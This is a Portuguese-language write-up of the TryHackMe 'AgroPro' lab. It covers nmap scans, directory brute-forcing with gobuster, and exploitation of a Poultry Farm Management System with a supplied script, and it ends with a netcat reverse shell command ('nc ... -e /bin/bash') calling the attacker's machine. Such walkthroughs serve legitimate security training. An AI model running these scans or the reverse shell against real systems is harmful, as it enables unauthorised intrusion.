<h1 align="center">💣 Write-up | 5M1TH - AgroPro (TryHackMe) 🌽</h1>

## 🔍 Varredura
vamos realizar a varredura básica com `nmap` para identificar os serviços disponíveis:

```bash
nmap -sS --open -v -Pn 10.10.20.73 -oN nmap_basic
```
<p align="center"> <img width="1500px" height="392" alt="image" src="https://github.com/user-attachments/assets/ed0a6860-1bc2-4d6a-b489-9fe49bcd7e58" /> </p>

Após identificar portas comuns, realizamos um scan mais agressivo e abrangente para detectar possíveis vetores de ataque em portas não padronizadas

```bash
nmap -sSV --open -p- -v -Pn 10.10.20.73 --min-rate=5000 -oN nmap
```
<p align="center"> <img width="1500px" height="586" alt="image" src="https://github.com/user-attachments/assets/e6d53a63-e6e8-4168-a1af-c39f6e7d738a" /> </p>

## 🔍 Enumeração
Vamos realizar a varredura básica com `nmap` para identificar os serviços disponíveis:

### 🔐 SSH – Porta 22
Fize uma varredura com alguns scripts do Nmap focados no SSH pra ver se aparecia algo interessante:

```bash
nmap -p 22 --script ssh* 10.10.20.73 -v
```
<p align="center"> <img width="1500px" height="481" alt="image" src="https://github.com/user-attachments/assets/8550647a-d39a-48b5-a3a7-bcd5c1f0d238" /> </p>

Depois de algumas tentativas de brute force que não deram em nada, a enumeração do SSH acabou revelando algo mais útil.

<p align="center"> <img width="1500px" alt="image" src="https://github.com/user-attachments/assets/cb11a051-8920-40e9-af03-fa457869b422" /> </p>

✅ Começou a dar bom! Descobrimos os métodos de autenticação e vimos que o acesso por usuário e senha está liberado.

### 🔐 HTTP – Porta 80
Durante a etapa de scanning, encontramos a porta 80 aberta — que geralmente indica um serviço web. Ao acessar via navegador, nos deparamos com essa página:

<p align="center"> <img width="1500px" height="645" alt="image" src="https://github.com/user-attachments/assets/e5037c39-4369-4e7c-8c15-d3963538a833" /> </p>

Pra entender melhor o que estava rodando ali, rodamos alguns scripts do Nmap voltados ao protocolo HTTP:

```BASH
nmap -p 80 --script http-methods,http-headers,http-enum 10.10.20.73 -v
```
Além de descobrir os métodos HTTP permitidos, também conseguimos pescar alguns diretórios interessantes no meio da enumeração.

Pra tentar achar mais coisa escondida, resolvi partir pro brute force de diretórios. Comecei pela wordlist mais básica, a common.txt do Dirb — só pra ver se tinha algo interessante:

````bash
gobuster dir -eu http://10.10.20.73 -w /usr/share/wordlists/dirb/common.txt -e --no-error -t 100
````
<p align="center"> <img width="1500px" height="517" alt="image" src="https://github.com/user-attachments/assets/2eade400-a3c0-4cb9-af94-09e53ccfd136" /></p>

Como nada muito útil apareceu, resolvi apelar pra big.txt, que costuma achar mais coisa:

````bash
gobuster dir -eu http://10.10.20.73 -w /usr/share/wordlists/dirb/big.txt -e --no-error -t 100
````
<p align="center"> <img width="1500px" height="499" alt="image" src="https://github.com/user-attachments/assets/3b9e5d1d-701a-4058-b12b-8974d393ee44" /> </p>

Nas dicas da máquina, foi citado que está rodando um `Poultry Farm Management System v1.0`. Com essa informação em mente, o diretório `/ranch` me chamou atenção:

<p align="center"> <img width="1500px" height="669" alt="image" src="https://github.com/user-attachments/assets/ccf671ba-1da3-4a1e-96c0-d1c6eabdc92a" /> </p>

Pra entender melhor o que estava por trás desse diretório, rodei o whatweb, que é uma ferramenta ótima pra identificar tecnologias web usadas no servidor:

````bash
whatweb http://10.10.20.73/ranch/
````

<p align="center"> <img width="1500px" height="105" alt="image" src="https://github.com/user-attachments/assets/43dff6a6-bc75-42f4-939c-11609e7d4ce9" /> </p>

## 🔍 Exploração

Como a própria room já entrega qual script devemos usar pra explorar a falha, só precisamos fazer uns ajustes rápidos pra que ele funcione corretamente.
Teremos que alterar três linhas:

<p align="center"> <img width="1500px" height="910" alt="image" src="https://github.com/user-attachments/assets/38497ec3-56a6-4701-84e3-dedc1eeb9eeb" /></p>

Com tudo ajustado, é só rodar:

````bash
python3 red.py
````
<p align="center"> <img width="1500px" height="247" alt="image" src="https://github.com/user-attachments/assets/311f64df-e849-4803-a391-eb758f886bc1" /></p>
Pronto! Já garantimos uma shell como www-data.

Agora, bora pegar uma shell reversa mais confortável.
Primeiro, iniciamos o listener no Kali:

````bash
nc -nlvp 445
````
<p align="center"> <img width="1500px" height="84" alt="image" src="https://github.com/user-attachments/assets/86c9b2b3-a377-436d-89a0-21860097f787" /></p>

Depois, do lado da vítima:

````bash
nc 10.21.173.102 445 -e /bin/bash
````
Conexão recebida com sucesso:
<p align="center"> <img width="1500px" height="135" alt="image" src="https://github.com/user-attachments/assets/4edbc4e9-34f3-4eb2-a9f6-d57f6a73f892" /></p>

Pra fechar, spawnamos uma shell interativa e ta na mão.
